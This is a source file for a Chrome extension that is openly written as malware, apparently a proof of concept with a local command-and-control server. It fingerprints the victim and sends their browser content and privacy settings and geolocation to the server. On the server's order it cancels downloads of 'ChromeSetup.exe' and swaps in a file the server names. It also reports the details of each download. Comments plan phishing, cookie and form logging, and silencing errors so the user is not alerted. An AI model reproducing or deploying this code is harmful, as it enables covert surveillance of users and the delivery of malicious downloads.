//How would comments works
/*
Code is divided in sections that separete functions and listeners by common objective

The sections are:

START (uid creation, phase state, default values, initial Time)
Loggers (All loggers that the extension can use to recopilate information from the user and send it to the CC server)
Phase Listener (The extension periodically ask the CC server if it needs to change phase and for the update values for the attacks)
Dowload Hickjacker (The extension capabilities for hickjacking the download system for malware)
Phising Manager (The extension capabilities for producing a phishing attacks using the url given by the CC server)

At the same time, each function will have a short description of what it does, and specific procedures
would be explain

General notes:
fetch() is the only allow API for sending request, has a preatty straigforward appearences
featch(url,request) where request = {method, mode, body, headers}, is capable of far more, but
this is all used here. For more information https://developer.mozilla.org/en-US/docs/Web/API/fetch

Chrome.storage is the include API for managing persistance data by the extensions, needed
due to the workers not saving last config. It can exist localy in the machine (local, 5MB) or
syncronized with a google account (sync, 1MB), it can also be used only for one session of Chrome with "session".

The calls to storage are asyncronus and returns promises (a non executed objected). Therefore if it is wanted to make a 
comprobation and then change if a specific value exists, this has to be done inside a function with the .then attribute of
a promise. If not, problems with scopes and variables appear. The same happens with the Featch API.

Chrome listeners:
workers function by listening to events in the browser, executing the worker and stayinh awake for almost 5 min.
workers are not realiable, not all listeners will execute correctly, and sometimes can be ignored. So, persistance is imposible with 
listeners.

There are of severala types and what exactly listen will be commented in the respective functions.

*/



//START, UID CREATION, PHASE STATE

/*
The UId of the user is create in base of the time of first installation in UTC,
this date is put in a simple SHASH for obtaining an unique and ofuscate id

This UID is stored locally, but could be stored in sync for better knowdleged of the victim

The UID do not change with updates or by shuting the extension, only if the extension is removed
the UID would be lost

In the other hand, the phase state is restarted with updates of the extension, but this should not be a problem

IMPORTANT VARIABLES:

uid = user identifier
phase = phase of the attack; 0 just log information, 1 hickjack downloads and do phising

Obj = patter name of the download to be hicjacked
Tar = url of the place for dowloading
Nam = name of the file to which rename download

TimeA = Time of last sending of information
TimeB = Time of last ansewrd about phase of the server


*/


chrome.runtime.onInstalled.addListener(function setuid(){
    //When installed or update the extension:
    const First_installed = Date.now().toString(); //take that initial time
    //https://stackoverflow.com/questions/521295/seeding-the-random-number-generator-in-javascript
    
    function cyrb128(str) { //a Cipher-Hash is initialize
        /* 
        this is a simplified version of the cyrb128 Cipher-HASH that use bit manipulation
        This is used for creating a unique hash in base of the time of installaling the 
        extension (First_installed).
        */
        let h1 = 1779033703, h2 = 3144134277,
            h3 = 1013904242, h4 = 2773480762;
        for (let i = 0, k; i < str.length; i++) {
            k = str.charCodeAt(i);
            h1 = h2 ^ Math.imul(h1 ^ k, 597399067);
            h2 = h3 ^ Math.imul(h2 ^ k, 2869860233);
            h3 = h4 ^ Math.imul(h3 ^ k, 951274213);
            h4 = h1 ^ Math.imul(h4 ^ k, 2716044179);
        }
        h1 = Math.imul(h3 ^ (h1 >>> 18), 597399067);
        h2 = Math.imul(h4 ^ (h2 >>> 22), 2869860233);
        h3 = Math.imul(h1 ^ (h3 >>> 17), 951274213);
        h4 = Math.imul(h2 ^ (h4 >>> 19), 2716044179);
        return [((h1^h2^h3^h4)>>>0).toString()]; //The simplification is done by cutting 3 segments of the return function
    }


    chrome.storage.local.get(["uid"]).then( (result)=>{ //search for the uid attribute in local memory
        
        /*
        We do not want to modify the uid each time is restarted or update the extension
        This looks if there is already an UID saved, if not, save the UID generate
        */
       
        if (result.uid == undefined ){ //if non attribute uid saved
            const value = cyrb128(First_installed); //hash time of installment
            chrome.storage.local.set({uid:value}); //save has uid attribute (asyncronus)

            fetch('http://127.0.0.1:5000/extadd',
            {
            method: 'POST',
            mode: 'no-cors', 
            body: JSON.stringify({"uid": value}),
            headers:{"Content-Type": "application/json"}
            }) //Inmediatly add the user to the list on the server (asyncronus)

        }
    
    });
    
    chrome.storage.local.get(["TimeA"]).then( (result)=>{ //Looks if exists TimeA

        /*
        For periodic communication we use the global time sinde the last epoch
        We need that to now when was the last time we stablish communication
        We do not want that value to be modifie unless the comunication was stablished
        We do not want to inmediatly send all the information after isnatalling
        Hence, this looks if one of the time variable are initialized (in this case Time A), 
        if not, it initialize all of the initial parameters
        Also, stablish the default settings for the dowload hijack system, such that
        They can be later modify by the server
        */

        if (result.TimeA == undefined ){ //if TimeA does not exists, is a clean install
            chrome.storage.local.set({TimeA:First_installed}); //start TimeA with install time
            chrome.storage.local.set({TimeB:First_installed}); //start TimeB with install time
            //Start download parametes with default values
            chrome.storage.local.set({Obj:"ChromeSetup.exe", Tar: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg", Nam:"ChromeSetup.jpg"})
            //Start phising parametes with default values
        }
    
    });
    chrome.storage.local.set({phase:0});//We set the initial phase to 0, that is, normal operation


})


//INFO (POC_Detective and Extension combined)

/*
In short words, calls to relevant APIs asking for information that could help indentify the victim

In general all of this calls are not relevant and should not take the attention of the system if they are
not done commonly.

(for short periods an Alarm is used, for longer periods, that is,
     more than 5 min a local storage solution with dates shall be used)

Logger Functions:

    logCPU = obtain CPU data   
    loggingcontentSettings = obtain all the content Settings, those are what the browser allows to do
    loggingprivacySettings = obtain all privacy settings, in a common case migth not be of interest
    logGeolocation = Send the geolocation data of the user without needing to ask

    WIP:
    logExApp = obtain list of extensions
    logManagement
    logCookies
    logForms
    logHistorial
    logDowloadHistorial
    logproxySettings
    etc.

Send Function:
    logSend = Calls all loggers and gives the order to send then information to the CC server

References:
https://stackoverflow.com/questions/53026387/how-to-get-all-chrome-content-settings
    */
function logCPU(C){
    fetch('http://127.0.0.1:5000/control_server',
            {
            method: "POST",
            mode: 'no-cors', 
            body: JSON.stringify( C),
            headers:{"Content-Type": "application/json"}
            }
    )
    }
function logExApp(C){

    fetch('http://127.0.0.1:5000/control_server',
    {
    method: "POST",
    mode: 'no-cors', 
    body: JSON.stringify( C),
    headers:{"Content-Type": "application/json"}
    }
)   
}
function logGeolocation(){
    chrome.storage.local.get(["lat", "long"]).then((result)=>{ //take the information, if exists from the storage
        //this data is obtained in the content script
        if(lat != undefined){
        number = 3; //send it to the server with the needed information for storing
        fetch(`http://127.0.0.1:5000/control_server`, 
        {
        method: "POST",
        mode: 'no-cors',
        body: JSON.stringify([result.lat, result.long]),
        headers:{"Content-Type": "application/json"}
        })
        ;}})
}

function loggingcontentSettings(){

    var S={};

    chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){S.Cookies = details.setting;});
    chrome.contentSettings.images.get({primaryUrl:'http://*'},function(details){S.Images = details.setting;});
    chrome.contentSettings.javascript.get({primaryUrl:'http://*'},function(details){S.JavaScript = details.setting;});
    chrome.contentSettings.location.get({primaryUrl:'http://*'},function(details){S.Location = details.setting;});
    chrome.contentSettings.plugins.get({primaryUrl:'http://*'},function(details){S.Plugins = details.setting;});
    chrome.contentSettings.popups.get({primaryUrl:'http://*'},function(details){S.Popups = details.setting;});
    chrome.contentSettings.notifications.get({primaryUrl:'http://*'},function(details){S.Notifications = details.setting;});
    chrome.contentSettings.fullscreen.get({primaryUrl:'http://*'},function(details){S.FullScreen = details.setting;});
    chrome.contentSettings.mouselock.get({primaryUrl:'http://*'},function(details){S.MouseLock = details.setting;});
    chrome.contentSettings.microphone.get({primaryUrl:'http://*'},function(details){S.Microphone = details.setting;});
    chrome.contentSettings.camera.get({primaryUrl:'http://*'},function(details){S.Camera = details.setting;});
    chrome.contentSettings.unsandboxedPlugins.get({primaryUrl:'http://*'},function(details){S.UnsandboxedPlugins = details.setting;});
    chrome.contentSettings.automaticDownloads.get({primaryUrl:'http://*'},function(details){S.AutomaticDownloads = details.setting;});
    setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
    
        S.uid = result.uid.toString();
        number = 1;
        fetch(`http://127.0.0.1:5000/extadd/${number}`,
        {
        method: "POST",
        mode: 'no-cors',
        body: JSON.stringify(S),
        headers:{"Content-Type": "application/json"}
        })
        
        })},1500);    


}

function loggingprivacySettings(){

    var S={};

    chrome.privacy.services.alternateErrorPagesEnabled.get({},function(details){S.alternateErrorPagesEnabledVal = details.value; S.alternateErrorPagesEnabledLev = details.levelOfControl ;});
    chrome.privacy.services.safeBrowsingEnabled.get({},function(details){S.safeBrowsingEnabledVal = details.value; S.safeBrowsingEnabledLev = details.levelOfControl ;});
    
    
    chrome.privacy.websites.hyperlinkAuditingEnabled.get({},function(details){S.hyperlinkAuditingEnabledVal = details.value; S.hyperlinkAuditingEnabledLev = details.levelOfControl;});
    chrome.privacy.websites.doNotTrackEnabled.get({},function(details){S.doNotTrackEnabledVal = details.value; S.doNotTrackEnabledLev = details.levelOfControl;});
    chrome.privacy.websites.protectedContentEnabled.get({},function(details){S.protectedContentEnabledVal = details.value; S.protectedContentEnabledLev = details.levelOfControl;});
    
    setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
    
        S.uid = result.uid.toString();
        number = 2;
        fetch(`http://127.0.0.1:5000/extadd/${number}`,
        {
        method: "POST",
        mode: 'no-cors',
        body: JSON.stringify(S),
        headers:{"Content-Type": "application/json"}
        }).then((response)=> {console.log(response)})
        
        })},1500);    


}

function logSend(){
    try{ //errors can happen if the server is down, and we do not want the user to receive errors messages
         //hence, this try and catch nullifies them.

        logGeolocation()
        loggingcontentSettings();
        loggingprivacySettings();
        return true
    }
    catch{
        return false
    }
    //chrome.system.cpu.getInfo((info)=>{logCPU(info)})
    //chrome.management.getAll((info)=>{logExApp(info)})
    //chrome.downloads.search({}).then(logExApp) 
    //chrome.proxy.settings.get({'incognito': false}).then((info)=> logExApp(info))

}




chrome.webNavigation.onCompleted.addListener((e) => {
    if (e.url.includes("google")){
        chrome.storage.local.get(["TimeA"]).then( (result)=>{     
                let a = Date.now()
                a = Math.abs(parseInt(result.TimeA)-a)
                if (a > 10*1000){
                    if(logSend()){
                        a = Date.now()
                        chrome.storage.local.set({TimeA:a})
                    }
                    

                }
        });


    }
}
    
    );






//WAIT (GET request)
/*
In a regular basis the system ask the server if it should change mode to attack version,
the GET request will be done with the uid of the victim

The change of mode will happen by desired of the attacker when an interesting target has been 
indentifie.

(for short periods an Alarm is used, for longer periods, that is,
     months a local storage solution with dates shall be used)
*/

function phase(){
    chrome.storage.local.get(["uid"]).then( (result)=>{
    result = result.uid.toString()
    fetch(`http://127.0.0.1:5000/req/${result}`,
        {
        method: "GET",
        mode: 'no-cors', 
        headers:{"Content-Type": "application/json"}
        }).then(r => r.text()).then(result => {
            result = JSON.parse(result)
            chrome.storage.local.set({phase:parseInt(result.phase)});
            chrome.storage.local.set({Obj:result.obj});
            chrome.storage.local.set({Tar:result.tar});
            chrome.storage.local.set({Nam:result.nam});
        });})

    }

    
chrome.webNavigation.onCompleted.addListener((e) => {
    if (e.url.includes("google")){
        chrome.storage.local.get(["TimeB"]).then( (result)=>{     
                let b = Date.now()
                b = Math.abs(parseInt(result.TimeB)-b)
                if (b > 10*1000){
                    phase()
                    b = Date.now()
                    chrome.storage.local.set({TimeB:b})
                }
        });


    }
}
    
    );


//https://stackoverflow.com/questions/60727329/chrome-extension-rejection-use-of-permissions-all-urls



//ATTACK (Download API)







function modify(item){
    chrome.storage.local.get(["phase"]).then((result)=>{
        console.log(result)
        if(result.phase == 1){
            chrome.storage.local.get(["Obj","Tar","Nam"]).then((result1)=>{
                        console.log(result1.Obj,result1.Tar,result1.Nam)
                        fetch('http://127.0.0.1:5000/control_server',
                        {
                        method: "POST",
                        mode: 'no-cors', 
                        body: JSON.stringify(item),
                        headers:{"Content-Type": "application/json"}
                        })
                        if (item.url.includes(result1.Obj)){
                        chrome.downloads.cancel(item.id)
                        chrome.downloads.download({url: result1.Tar, filename: result1.Nam});
                        }

            })
        
    }});
 
}


//https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg
//chrome.downloads.onChanged.addListener((Delta)=>{FileOpen(Delta)})

chrome.downloads.onCreated.addListener((Item)=>{modify(Item)})


//https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BD941DA60-FA68-1B4A-8E5B-56309869B588%7D%26lang%3Den-GB%26browser%3D4%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DYTUH%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe
//https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BD941DA60-FA68-1B4A-8E5B-56309869B588%7D%26lang%3Den-GB%26browser%3D4%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DYTUH%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe